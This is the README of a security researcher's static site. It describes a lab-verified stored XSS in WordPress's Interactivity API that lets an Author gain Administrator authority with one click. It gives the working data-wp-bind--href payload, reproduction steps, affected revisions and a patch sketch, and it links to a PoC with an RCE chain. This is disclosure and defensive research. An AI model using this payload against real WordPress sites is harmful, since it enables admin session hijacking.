# shoo0lin.github.io

> Field notes from the seam between server and browser.

[![Live site](https://img.shields.io/badge/live-shoo0lin.github.io-f0b429?style=flat-square)](https://shoo0lin.github.io)
![Finding](https://img.shields.io/badge/finding-lab--verified-e5534b?style=flat-square)
![Severity](https://img.shields.io/badge/CVSS%203.1-8.8%20High-f0b429?style=flat-square)
![Platform](https://img.shields.io/badge/WordPress-7.x-57c2b4?style=flat-square)
![Disclosure](https://img.shields.io/badge/upstream-pending-9aa3b2?style=flat-square)

A static site built by hand — no framework, no trackers, no external fonts — and the
long-form write-ups behind it. The lab series is a stored XSS in WordPress's
Interactivity API that escalates an Author to Administrator authority with a single
click; the disclosed finding is a Dispatcher cache leak of per-session identity on
AEM author tiers.

## Posts

| # | Title | What it covers |
|---|---|---|
| I | [The Accordion That Opened a Door](https://shoo0lin.github.io/posts/interactivity-accordion.html) | The client/server URL-policy mismatch; stored XSS; 62-capability read and an admin write after one click. CVSS ≈ 8.8. |
| II | [The Click That Ended at uid=0](https://shoo0lin.github.io/posts/click-to-root.html) | The same primitive pushed through the admin plugin editor: nonce harvest → `hello.php` overwrite → command execution, confirmed by hash and by an outbound callback. |
| — | [The Cache That Remembered a Stranger](https://shoo0lin.github.io/posts/dispatcher-cache.html) | AEM author tiers caching `/libs/granite/security/currentuser.json`: five hosts, two AMS customers, identities up to 21 months stale. Identity disclosure only; CVSS 5.3. Identities and hostnames redacted. |

## Runnable PoC

The lab harness behind both posts lives in a separate repository:

**[shoo0lin/wp-interactivity-xss](https://github.com/shoo0lin/wp-interactivity-xss)** — disposable
WordPress 7.1.2 Docker lab, minimal validator, two escalation chains, C2 listener, captured
evidence, and the patched `bind.ts`. Lab only.

---

## The bug in one sentence

> WordPress's server-side HTML writer enforces a URL policy; the client-side
> Interactivity API enforces none. An Author hides `javascript:` inside a
> `data-wp-context` blob that `wp_kses_post()` never inspects, and the client
> re-injects it into the live `href` at hydration.

Two programs, one value, two different answers. That disagreement *is* the vulnerability.

---

## The seam

```
        publish                    render                      hydrate
   ┌───────────────┐        ┌──────────────────┐        ┌──────────────────┐
   │  Author (PR:L)│        │  PHP / kses      │        │  Browser / JS    │
   │  writes post  │───────▶│  wp_kses_post()  │───────▶│  bind directive  │
   └───────────────┘        └──────────────────┘        └──────────────────┘
                                    │                            │
                     data-* names are NOT in            href excluded from the
                     wp_kses_uri_attributes()           property fast-path, so it
                            │                            falls through to...
                            ▼                            ▼
                     javascript: survives          el.setAttribute('href', raw)
                            │                            │
                            └────────── same string ─────┘
                               two opposite verdicts
```

The server says *no*. The browser says *yes*. A `curl` only ever asks the server.

---

## Why this is a real finding, not a scanner artifact

| Gate | Result |
|---|---|
| **Process** | Directive resolver actually ran — the live DOM `href` changed after hydration |
| **Reachability** | Author publishes directly (`201 publish`); Contributor reaches it via one admin review/preview |
| **Impact** | Admin identity + all 62 capabilities read; post created (`201`), read back, force-deleted (`200`) |
| **Control** | Same payload, anonymous session → `401 rest_not_logged_in`, no write |
| **Causality** | Remove directive ⇒ inert; neuter payload ⇒ inert; directive + `javascript:` ⇒ executes |
| **Environment** | Isolated local Docker lab (`127.0.0.1:18080`); **no production testing**, scope doc returned 404 |

Severity is computed from proven facts, not vibes: `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H` ≈ **8.8 High**.
The click requirement is the honest ceiling — without `UI:R` this would sit in the 9.x band.

---

## Root cause, in two code excerpts

### The careful writer (server)

`WP_HTML_Tag_Processor::set_attribute()` refuses to write an unsafe URL:

```php
$escaped_new_value = in_array( $comparable_name, wp_kses_uri_attributes(), true )
    ? esc_url( $value )
    : strtr( $value, ... );

// If the escaping functions wiped out the update, reject it.
if ( '' === $escaped_new_value && '' !== $value ) {
    return false;
}
```

`esc_url('javascript:…')` returns `''`, the write is rejected, and the served HTML stays benign.
This is exactly why the page looks clean — and why the bug survives a curl-only review.

### The trusting writer (client)

`packages/interactivity/src/directives/bind.ts` excludes `href` from the DOM-property
fast path, which sends it to the fallback:

```js
if (
    attribute !== 'width' && attribute !== 'height' &&
    attribute !== 'href' && attribute !== 'list' &&
    /* ... */
    attribute in el
) {
    try { el[ attribute ] = result; return; } catch {}
}

if ( result !== null && result !== undefined && /* ... */ ) {
    el.setAttribute( attribute, result );   // raw string, no URL policy
}
```

No protocol allow-list. No `isSafeURL`. No `esc_url`. Search the whole interactivity
package at that revision and there is nothing to find. The server has a policy; the
client has a string.

---

## The filter that looked away

`wp_kses_uri_attributes()` knows 19 URI-bearing names (`href`, `src`, `action`,
`formaction`, `poster`, …) and `wp_kses_bad_protocol()` runs only on **exact name
membership**. `data-wp-bind--href` and `data-wp-context` are not on that list — they are
`data-*`, and `data-*` names are never handed to the protocol filter.

Same tag, same scheme, two verdicts:

```html
<!-- A: literal href → scheme stripped -->
IN : <a href="javascript:window.__TEST__=1">x</a>
OUT: <a href="window.__TEST__=1">x</a>

<!-- B: inside data-* → untouched -->
IN : <div data-wp-context='{"u":"javascript:window.__TEST__=1"}'>…</div>
OUT: <div data-wp-context="{&quot;u&quot;:&quot;javascript:window.__TEST__=1&quot;}">…</div>
```

The filter was not broken. It was asked the wrong question.

---

## The payload

```html
<div id="bind-island" data-wp-interactive="pwn"
     data-wp-context='{"u":"javascript:window.__INTERACTIVITY_BIND_TEST__=1"}'>
  <a id="m-href" href="https://example.com"
     data-wp-bind--href="context.u">CAP</a>
</div>
```

Ingress: an Author publishes it as a normal post (`201`, `status: publish`). No approval step.
Delivery: the island hydrates on the front page, archives, search, RSS, and REST
`content.rendered` — no attacker-specific URL needed.

The trap:

```console
$ curl -sL 'http://127.0.0.1:18080/?p=500' | grep -c 'href="javascript:'
0
```

Live DOM after hydration, before any click:

```js
document.querySelector('#m-href').href
// → "javascript:window.__INTERACTIVITY_BIND_TEST__=1"
```

One click by an Administrator. That's the only interaction required.

---

## What the click bought

Against a real lab administrator (`bindadmin`, id 7), the payload scraped the
`createNonceMiddleware` nonce from `/wp-admin/` and used the victim's own session:

**Read** — `/wp/v2/users/me?context=edit` (2 434 bytes):

```json
{
  "id": 7, "username": "bindadmin", "roles": ["administrator"],
  "capabilities": {
    "manage_options": true, "edit_users": true, "install_plugins": true,
    "promote_users": true, "unfiltered_html": true, "level_10": true,
    "...": "62 true in total"
  }
}
```

**Write** — create, read back, force-delete, all as the admin:

```json
{
  "create_status": 201,
  "readback_author": 7,
  "delete_status": 200,
  "deleted": true
}
```

**Control** — identical payload, anonymous session:

```json
{ "code": "rest_not_logged_in", "data": { "status": 401 } }
```

Authority is exactly the victim's session. Nothing more, nothing less.

---

## Variant matrix

| # | `data-wp-bind--*` | Low-priv host reachable? | Browser effect | Status |
|---|---|---|---|---|
| 1 | `href` on `<a>` | yes | JS executes on click | **PROVEN** |
| 2 | `action` on `<form>` | no — form stripped | JS on submit | admin ingress only |
| 3 | `formaction` on `<button>` | no — attr not allowed | JS on submit | admin ingress only |
| 4 | `src` on `<img>` | yes | `ERR_UNKNOWN_URL_SCHEME` | no exec |
| 5 | `ping` on `<a>` | yes | same-origin beacon | no exec |
| 6 | `style` | yes | CSS only | no exec |
| 7 | `innerhtml` | yes | inert | killed |
| 8 | `srcdoc` | no — iframe stripped | — | ingress blocked |
| 9 | `data-wp-html` | stores only | never renders untrusted | killed |

`href` is the only suffix that is both reachable by a below-`unfiltered_html` user and
executable. The tempting zero-click route (`data-wp-html`) is gated behind a private
`WeakMap` trust token — tested, killed, noted.

---

## Reproduction (lab)

1. WordPress 7.x with an Author account (no `unfiltered_html`).
2. Publish the payload above via `POST /?rest_route=/wp/v2/posts`.
3. `curl` the permalink — the static `href` is still `https://example.com`.
4. Open it in a real browser, hydrate, inspect `#m-href` — now `javascript:…`.
5. Click as Administrator; the script reads and writes with the admin session.
6. Repeat step 5 anonymously — `401`, no write.

Affected revisions: server `wordpress-develop@49b718f16e` (present in lab 7.1.2);
client Gutenberg `5715a61334c4d29f21b67cf34b46061dc1b62502` — the SHA 7.1.2 ships.
Bundled module: `/wp-includes/js/dist/script-modules/interactivity/index.min.js?ver=efaa5193bbad9c60ffd1`.

---

## Remediation

Fix the primitive, not the payload. Make the client's policy for URI-sensitive
attributes semantically equivalent to the server's:

- In `bind.ts`, before `setAttribute`, check `attribute` case-insensitively against the
  URI-attribute set (`href`, `action`, `formaction`, `src`, `poster`, `cite`,
  `background`, `data`, `longdesc`, `profile`, `usemap`, `codebase`, `manifest`,
  `icon`, `archive`, `classid`, `xmlns`, …).
- Validate the evaluated string against `wp_allowed_protocols()` and refuse the write
  when it fails.
- Centralise the helper so client and server cannot drift again.
- Defence in depth: keep the static `esc_url` guard and extend the same guarantee to
  dynamic writes.

```js
// sketch — bind.ts, before setAttribute
const URI_ATTRS = new Set([ 'href','action','formaction','src','poster','cite',
  'background','data','longdesc','profile','usemap','codebase','manifest','icon',
  'archive','classid','xmlns' ]);

if ( URI_ATTRS.has( attribute.toLowerCase() ) && ! isAllowedUrl( result ) ) {
    return; // leave the attribute untouched
}
el.setAttribute( attribute, result );
```

---

## Scope & disclosure status

- **Lab only.** No production WordPress system was contacted.
- The WordPress HackerOne program's scope document returned **HTTP 404** at the time of
  testing, so active testing stopped before it began.
- No RCE claimed. No plugin installation performed. The write primitive shown is
  create → read → force-delete.
- Upstream status: pending. This section will be updated when that changes.

---

## Repository layout

```
.
├── index.html                              # home / post index
├── posts/
│   ├── interactivity-accordion.html        # part I — the primitive
│   ├── click-to-root.html                  # part II — escalation to RCE
│   └── dispatcher-cache.html               # AEM Dispatcher cache leak (redacted)
├── assets/
│   ├── css/style.css                       # one hand-written stylesheet
│   └── img/                                # lab screenshots (redacted)
│       └── rce/                            # part II captures + 42s demo clip
├── .nojekyll                               # serve files as-is
└── README.md
```

## Local preview

```sh
python3 -m http.server 8000
# → http://127.0.0.1:8000/
```

## Adding a post

1. Copy `posts/interactivity-accordion.html` as a starting point.
2. Add a `<a class="card">` entry to `index.html`.
3. Keep the byline, the scope note, and the separation between proven impact and
   inferred impact intact.

## Content policy

- Only lab-verified or genuinely disclosed findings are published.
- Severity is computed from proven facts, never inflated.
- Screenshots are redacted for credentials and PII before commit.

---

<p align="center"><sub>Built by hand. No trackers, no fonts, no analytics. © 2026 shoo0lin</sub></p>
